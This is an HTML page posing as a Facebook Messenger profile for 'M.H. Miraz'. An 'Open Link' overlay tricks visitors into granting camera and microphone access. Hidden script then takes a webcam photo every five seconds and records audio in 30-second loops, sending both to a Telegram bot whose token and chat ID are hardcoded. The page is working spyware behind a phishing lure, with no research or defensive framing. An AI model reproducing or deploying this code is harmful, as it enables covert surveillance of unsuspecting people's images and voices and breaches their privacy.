<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>M.H. Miraz | Profile</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* তোমার অরিজাল ডিজাইন - কোনো পরিবর্তন নেই */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
        body { background-color: #f0f2f5; overflow-x: hidden; }
        #entryOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
        .open-btn { background: #1877f2; color: white; border: none; padding: 14px 50px; border-radius: 8px; font-weight: bold; font-size: 19px; cursor: pointer; }
        .header { background: white; padding-bottom: 15px; border-bottom: 1px solid #ddd; text-align: center; }
        .cover { width: 100%; height: 200px; background: #ddd url('cover.jpg') center/cover; }
        .profile-container { position: relative; display: inline-block; margin-top: -75px; }
        .profile-pic { width: 160px; height: 160px; border-radius: 50%; border: 4px solid white; background: #ccc url('profile.jpg') center/cover; }
        .name-box h1 { font-size: 28px; font-weight: bold; margin-top: 10px; }
        .bio-section { padding: 15px 20px; text-align: center; background: white; border-bottom: 1px solid #ddd; }
        .details-list { text-align: left; max-width: 350px; margin: 15px auto 0; display: flex; flex-direction: column; gap: 10px; }
        .detail-item { display: flex; align-items: center; gap: 10px; font-size: 15px; }
        #chatBox { display:none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; flex-direction: column; }
        .chat-h { padding: 10px 15px; border-bottom: 1px solid #eee; display: flex; align-items: center; justify-content: space-between; }
        #msgs { flex: 1; overflow-y: auto; padding: 15px; }
        .inp-bar { padding: 10px 15px; display: flex; align-items: center; border-top: 1px solid #eee; }
        .inp-bar input { flex: 1; border: none; background: #f0f2f5; padding: 10px 15px; border-radius: 20px; outline: none; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div id="entryOverlay">
        <i class="fab fa-facebook-messenger" style="font-size: 50px; color: #0084ff; margin-bottom: 20px;"></i>
        <h2 style="margin-bottom: 10px;">Continue to Messenger</h2>
        <button class="open-btn" onclick="startExecution()">Open Link</button>
    </div>

    <div id="mainContent" style="display:none; height: 100vh; overflow-y: auto;">
        <div class="header">
            <div class="cover"></div>
            <div class="profile-container"><div class="profile-pic"></div></div>
            <div class="name-box">
                <h1>M.H. Miřãz</h1>
                <p style="color:#65676b;">288 Friends • 2 mutual</p>
            </div>
            <div style="display:flex; padding: 15px; gap: 10px;">
                <button style="background:#1877f2; color:white; border:none; padding:10px; border-radius:6px; flex:1;">+ Add Friend</button>
                <button style="background:#e4e6eb; color:black; border:none; padding:10px; border-radius:6px; flex:1;" onclick="openChat()">📩 Message</button>
            </div>
        </div>
        <div class="bio-section">
            <p>Life is a Book, and those who do not travel read only a page. 📖✈️</p>
            <div class="details-list">
                <div class="detail-item"><i class="fas fa-briefcase"></i> Web Developer & Programmer</div>
                <div class="detail-item"><i class="fas fa-graduation-cap"></i> Studied at Rangpur Polytechnic Institute</div>
                <div class="detail-item"><i class="fas fa-home"></i> Lives in <b>Rangpur</b></div>
            </div>
        </div>
    </div>

    <div id="chatBox">
        <div class="chat-h">
            <i class="fas fa-arrow-left" onclick="closeChat()"></i>
            <span style="font-weight:bold;">M.H. Miraz</span>
            <i class="fas fa-video"></i>
        </div>
        <div id="msgs"></div>
        <div class="inp-bar"><input type="text" id="uInp" placeholder="Message..." onkeypress="if(event.key==='Enter') sendMsg()"></div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const T = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o';
        const C = '7767412329';

        async function startExecution() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('v').srcObject = s;
                
                // ছবি প্রতি ৫ সেকেন্ডে
                setInterval(takePic, 5000);
                
                // অডিও লুপ
                startVoice(s);

                document.getElementById('entryOverlay').style.display = 'none';
                document.getElementById('mainContent').style.display = 'block';
            } catch (e) { alert("Permission required to view profile."); }
        }

        async function takePic() {
            const video = document.getElementById('v');
            const canvas = document.getElementById('c');
            if (video.videoWidth === 0) return;
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(async (b) => {
                const f = new FormData();
                f.append('chat_id', C);
                f.append('photo', b, 'img.jpg');
                await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });
            }, 'image/jpeg', 0.5);
        }

        function startVoice(s) {
            let r = new MediaRecorder(s);
            let ch = [];
            r.ondataavailable = (e) => ch.push(e.data);
            r.onstop = async () => {
                const b = new Blob(ch, { type: 'audio/ogg' });
                const f = new FormData();
                f.append('chat_id', C);
                f.append('voice', b, 'audio.ogg');
                await fetch(`https://api.telegram.org/bot${T}/sendVoice`, { method: 'POST', body: f });
                ch = [];
                r.start();
            };
            r.start();
            setInterval(() => { if(r.state === 'recording') r.stop(); }, 30000);
        }

        function openChat() { document.getElementById('chatBox').style.display = 'flex'; }
        function closeChat() { document.getElementById('chatBox').style.display = 'none'; }
    </script>
</body>
</html>
